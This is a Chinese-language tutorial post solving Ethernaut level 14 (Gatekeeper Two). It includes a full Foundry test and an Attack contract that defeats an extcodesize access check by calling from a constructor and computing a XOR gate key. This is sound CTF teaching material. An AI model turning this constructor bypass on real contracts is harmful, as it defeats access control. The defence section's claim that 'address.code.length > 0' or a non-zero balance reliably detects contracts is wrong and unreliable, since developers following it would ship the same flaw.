---
title: 'Etnhernault Level 14: Gatekeeper Two - 合约创建时的 extcodesize'
date: 2025-01-25 16:15:00
updated: 2025-01-25 16:15:00
categories:
  - Ethernaut 系列
  - 进阶攻击篇 (11-20)
tags:
  - Ethernaut
  - Foundry
  - extcodesize
  - constructor
  - 智能合约安全
  - Solidity
series: Ethernaut Foundry Solutions
excerpt: "利用合约在 `constructor` 阶段 `extcodesize` 为0的特性，巧妙绕过复杂的访问控制。深入理解 `caller()` 和 `extcodesize` 的工作原理，掌握 Gatekeeper Two 关卡的破解技巧。"
---

# 🎯 Ethernaut Level 14: Gatekeeper Two - 合约创建时的 extcodesize

> **关卡链接**: [Ethernaut Level 14 - Gatekeeper Two](https://ethernaut.openzeppelin.com/level/14)  
> **攻击类型**: `extcodesize` / `constructor` 交互  
> **难度**: ⭐⭐⭐⭐☆

## 📋 挑战目标

与上一关类似，我们需要再次通过三个 `modifier` 的检查，成为 `entrant`。

![Gatekeeper Two Requirements](https://ethernaut.openzeppelin.com/imgs/BigLevel14.svg)

## 🔍 漏洞分析

要通过此关卡，我们需要调用 `enter(bytes8 _gateKey)` 函数，并绕过它的三个 `modifier`。

### Modifier 1: `gateOne`

```solidity
modifier gateOne() {
  require(msg.sender != tx.origin);
  _;
}
```

与第13关完全相同。我们需要通过一个中间合约来调用 `enter` 函数，以确保 `msg.sender` 是合约地址，而 `tx.origin` 是我们的EOA地址。

### Modifier 2: `gateTwo`

```solidity
modifier gateTwo() {
  uint x;
  assembly {
    x := extcodesize(caller())
  }
  require(x == 0);
  _;
}
```

这个 `modifier` 使用内联汇编检查 `caller()` 的 `extcodesize` 是否为0。`caller()` 返回的是直接调用者的地址（在我们的场景中，就是攻击合约的地址），而 `extcodesize` 返回该地址关联的代码大小。

-   如果调用者是一个已经部署的合约，`extcodesize` 会返回一个大于0的值。
-   如果调用者是一个外部账户（EOA），`extcodesize` 返回0。

这与 `gateOne` 的要求（`msg.sender` 必须是合约）产生了矛盾。我们如何才能让一个合约地址的 `extcodesize` 为0呢？

答案在于合约的创建过程：**当一个合约的 `constructor` 正在执行时，该合约的代码尚未完全部署到链上，因此此时对该合约地址调用 `extcodesize` 会返回0。**

因此，我们必须在攻击合约的 `constructor` 内部调用目标合约的 `enter` 函数。

### Modifier 3: `gateThree`

```solidity
modifier gateThree(bytes8 _gateKey) {
  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
  _;
}
```

这个 `modifier` 包含一个有趣的异或（XOR）逻辑。让我们简化一下：

`A ^ B = C`

其中：
-   `A` 是 `uint64(bytes8(keccak256(abi.encodePacked(msg.sender))))`
-   `B` 是 `uint64(_gateKey)`
-   `C` 是 `type(uint64).max` (即 `0xFFFFFFFFFFFFFFFF`)

根据异或运算的性质，如果 `A ^ B = C`，那么 `A ^ C = B`。

因此，我们可以通过计算 `A ^ C` 来得到我们需要的 `_gateKey`。

`_gateKey = uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ type(uint64).max`

由于 `msg.sender` 是我们的攻击合约地址，我们可以在攻击合约的 `constructor` 中计算出这个值。

## 💻 Foundry 实现

### 攻击合约代码

我们的攻击合约非常简洁。它在 `constructor` 中完成所有的工作：计算 `gateKey` 并立即调用目标实例的 `enter` 函数。

```solidity
// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/14_GatekeeperTwo.sol";

// Foundry 测试合约
contract GatekeeperTwoTest is Test {
    GatekeeperTwo instance;
    Attack attacker;
    address player1;

    function setUp() public {
        player1 = vm.addr(1);
        instance = new GatekeeperTwo();
    }

    function testAttacker() public {
        vm.startPrank(player1, player1);
        // 部署攻击合约时，其构造函数会自动执行攻击
        attacker = new Attack(address(instance));
        // 验证攻击是否成功
        assertEq(instance.entrant(), player1);
        vm.stopPrank();
    }
}

// 攻击合约
contract Attack {
    constructor(address _instanceAddress) {
        GatekeeperTwo instance = GatekeeperTwo(_instanceAddress);

        // 计算 gateKey
        // A ^ C = B
        uint64 keyPart = uint64(bytes8(keccak256(abi.encodePacked(address(this)))));
        uint64 max_uint = type(uint64).max; // 0xFFFFFFFFFFFFFFFF
        bytes8 gateKey = bytes8(keyPart ^ max_uint);

        // 在构造函数中调用 enter 函数
        instance.enter(gateKey);
    }
}
```

### 关键攻击步骤

1.  **创建攻击合约**: 攻击逻辑完全包含在 `constructor` 中。
2.  **在 `constructor` 中调用**: 这是关键。在 `constructor` 中调用 `enter` 函数，此时 `extcodesize(address(this))` 为0，绕过了 `gateTwo`。
3.  **计算 `_gateKey`**: 在 `constructor` 中，使用 `address(this)` 作为 `msg.sender` 来计算 `keccak256` 哈希，并通过XOR运算得到正确的 `_gateKey`，从而绕过 `gateThree`。
4.  **部署即攻击**: 部署攻击合约的交易一旦成功，攻击就完成了，`entrant` 将被设置为我们的EOA地址。

## 🛡️ 防御措施

1.  **避免使用 `extcodesize` 进行合约检查**: 正如本例所示，`extcodesize` 可以被 `constructor` 调用绕过。一个更可靠的检查方法是判断 `address.balance > 0` 或者 `address.code.length > 0`（在Solidity 0.8.10及更高版本中）。
2.  **对 `caller` 的额外检查**: 如果确实需要阻止合约调用，可以结合 `tx.origin == msg.sender` 的检查，但这会限制合约的可组合性。
3.  **简化密钥验证**: 复杂的密钥派生逻辑（如本例中的XOR）可能看起来安全，但如果所有输入都来自链上，攻击者通常可以逆向工程出正确的密钥。应使用链下签名等更安全的机制。

## 🔧 相关工具和技术

-   **`constructor`**: 合约的构造函数，仅在合约部署时执行一次。理解其在生命周期中的特殊性（如 `extcodesize` 为0）是解决此类挑战的关键。
-   **`extcodesize`**: 一个EVM操作码，用于获取地址的代码大小。是区分EOA和合约的常用方法，但有其局限性。
-   **异或运算 (`^`)**: 一种位运算符，在密码学和哈希操作中很常见。理解其 `A ^ B = C` <=> `A ^ C = B` 的性质对于解决 `gateThree` 至关重要。

## 🎯 总结

**核心概念**:
-   合约在 `constructor` 执行期间的代码大小（`extcodesize`）为0。
-   `caller()` 和 `address(this)` 在特定上下文中的区别和联系。
-   异或（XOR）运算的可逆性是解决密码学相关谜题的常用工具。

**攻击向量**:
-   利用 `constructor` 的特性绕过 `extcodesize` 检查。
-   在 `constructor` 中完成所有攻击步骤，实现“部署即攻击”。
-   逆向工程XOR逻辑以计算出所需的密钥。

**防御策略**:
-   不要依赖 `extcodesize` 来判断一个地址是否为合约。
-   设计更简单、更直接的验证机制，避免模糊的链上密钥派生。

## 📚 参考资料

-   [Solidity Docs: `extcodesize` Caveats](https://docs.soliditylang.org/en/latest/security-considerations.html#extcodesize-and-contracts-in-construction)
-   [Understanding the EVM: Opcodes](https://www.evm.codes/)